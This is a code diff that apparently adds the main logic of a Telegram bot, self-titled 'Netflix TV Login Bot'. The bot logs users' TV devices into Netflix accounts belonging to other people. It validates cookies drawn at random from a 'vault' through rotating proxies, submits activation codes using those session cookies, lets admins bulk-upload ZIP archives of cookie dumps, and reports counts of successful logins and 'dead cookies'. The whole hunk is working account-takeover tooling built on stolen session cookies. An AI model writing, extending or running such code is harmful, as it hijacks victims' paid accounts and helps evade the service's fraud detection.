@@ -539,4 +539,193 @@ async def tv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             stats["total_logins"] += 1
             stats["codes_rejected"] += 1
         response = (
-            f"❌
+            f"❌ <b>Activation Failed</b>\n\n"
+            f"📺 Code: <code>{tv_code}</code>\n"
+            f"🌍 Cookie Country: <b>{result.get('country', 'N/A')}</b>\n"
+            f"⚠️ Error: {result.get('error', 'Unknown')}\n\n"
+            f"<i>Please try again with a fresh code.</i>"
+        )
+
+    await status_msg.edit_text(response, parse_mode=ParseMode.HTML)
+
+
+def process_tv_login(tv_code):
+    proxies = proxies_list
+    max_attempts = min(50, max(count_vault_cookies(), 50))
+    
+    for _ in range(max_attempts):
+        filename, content = get_random_cookie_file()
+        if not filename or not content:
+            return {"success": False, "error": "no_cookies"}
+
+        cookies = extract_cookie_dict(content)
+        if not cookies:
+            continue
+
+        proxy = random.choice(proxies) if proxies else None
+        valid, country, plan = validate_cookie(cookies, proxy)
+
+        if not valid:
+            continue
+
+        session = requests.Session()
+        session.cookies.update(cookies)
+        res = submit_tv_code(session, tv_code, proxy)
+        res["country"] = country
+        res["plan"] = plan
+        res["cookie_file"] = filename
+        return res
+
+    return {"success": False, "error": "all_dead"}
+
+
+async def upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    message_id = update.message.message_id
+
+    if user_id not in ADMIN_IDS:
+        await update.message.reply_text(
+            "🚫 <b>Admin only!</b>",
+            parse_mode=ParseMode.HTML,
+            reply_to_message_id=message_id,
+        )
+        return
+
+    if not update.message.reply_to_message or not update.message.reply_to_message.document:
+        await update.message.reply_text(
+            "📎 <b>Usage:</b> Reply to a ZIP file with <code>/upload</code>\n\n"
+            "ZIP should contain .txt or .json cookie files.",
+            parse_mode=ParseMode.HTML,
+            reply_to_message_id=message_id,
+        )
+        return
+
+    doc = update.message.reply_to_message.document
+    if not doc.file_name.lower().endswith('.zip'):
+        await update.message.reply_text(
+            "❌ Only <b>.zip</b> files are accepted!",
+            parse_mode=ParseMode.HTML,
+            reply_to_message_id=message_id,
+        )
+        return
+
+    status_msg = await update.message.reply_text(
+        "📥 <b>Downloading...</b>",
+        parse_mode=ParseMode.HTML,
+        reply_to_message_id=message_id,
+    )
+
+    try:
+        file = await context.bot.get_file(doc.file_id)
+        zip_bytes = await file.download_as_bytearray()
+
+        await status_msg.edit_text("📂 <b>Extracting...</b>", parse_mode=ParseMode.HTML)
+
+        os.makedirs(COOKIES_DIR, exist_ok=True)
+        added = 0
+        skipped = 0
+
+        with zipfile.ZipFile(io.BytesIO(zip_bytes), 'r') as zf:
+            for name in zf.namelist():
+                if name.endswith('/') or name.startswith('__MACOSX') or name.startswith('.'):
+                    continue
+                if not name.lower().endswith(('.txt', '.json')):
+                    skipped += 1
+                    continue
+                try:
+                    content = zf.read(name).decode('utf-8', errors='ignore')
+                    cookies = extract_cookie_dict(content)
+                    if not cookies:
+                        skipped += 1
+                        continue
+                    base = os.path.basename(name)
+                    safe_name = re.sub(r'[<>:"/\\|?*]', '_', base)
+                    dest = os.path.join(COOKIES_DIR, safe_name)
+                    if os.path.exists(dest):
+                        suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
+                        name_part, ext = os.path.splitext(safe_name)
+                        dest = os.path.join(COOKIES_DIR, f"{name_part}_{suffix}{ext}")
+                    with open(dest, 'w', encoding='utf-8') as f:
+                        f.write(content)
+                    added += 1
+                except:
+                    skipped += 1
+
+        vault_count = count_vault_cookies()
+        await status_msg.edit_text(
+            f"✅ <b>Upload complete!</b>\n\n"
+            f"📥 Added: <b>{added}</b> cookies\n"
+            f"⏭️ Skipped: <b>{skipped}</b>\n"
+            f"🍪 Total in vault: <b>{vault_count}</b>",
+            parse_mode=ParseMode.HTML,
+        )
+
+    except Exception as e:
+        await status_msg.edit_text(f"❌ <b>Error:</b> {str(e)}", parse_mode=ParseMode.HTML)
+
+
+async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    message_id = update.message.message_id
+
+    if user_id not in ADMIN_IDS:
+        await update.message.reply_text(
+            "🚫 <b>Admin only!</b>",
+            parse_mode=ParseMode.HTML,
+            reply_to_message_id=message_id,
+        )
+        return
+
+    vault_count = count_vault_cookies()
+    with stats_lock:
+        msg = (
+            f"📊 <b>Bot Statistics</b>\n\n"
+            f"🍪 <b>Cookies in vault:</b> {vault_count}\n"
+            f"🎬 <b>Total logins attempted:</b> {stats['total_logins']}\n"
+            f"✅ <b>Successful:</b> {stats['successful']}\n"
+            f"❌ <b>Failed (dead cookies):</b> {stats['failed']}\n"
+            f"🚫 <b>Codes rejected:</b> {stats['codes_rejected']}\n"
+            f"⏰ <b>Bot started:</b> {stats['started_at']}\n"
+        )
+    await update.message.reply_text(
+        msg,
+        parse_mode=ParseMode.HTML,
+        reply_to_message_id=message_id,
+    )
+
+
+# ══════════════════════════════════════════════════════════════════════
+#  MAIN
+# ══════════════════════════════════════════════════════════════════════
+
+def main():
+    print("=" * 50)
+    print("  Netflix TV Login Bot")
+    print("=" * 50)
+    print()
+
+    os.makedirs(COOKIES_DIR, exist_ok=True)
+
+    vault_count = count_vault_cookies()
+    print(f"[*] Cookies in vault: {vault_count}")
+    print(f"[*] Proxies loaded: {len(proxies_list)}")
+    print(f"[*] Admin IDs: {ADMIN_IDS}")
+    print()
+
+    app = Application.builder().token(BOT_TOKEN).build()
+
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("tv", tv_command))
+    app.add_handler(CommandHandler("upload", upload_command))
+    app.add_handler(CommandHandler("stats", stats_command))
+
+    print("[*] Bot started! Press Ctrl+C to stop.")
+    app.run_polling(allowed_updates=Update.ALL_TYPES)
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n[!] Stopped.")
+        sys.exit(0)
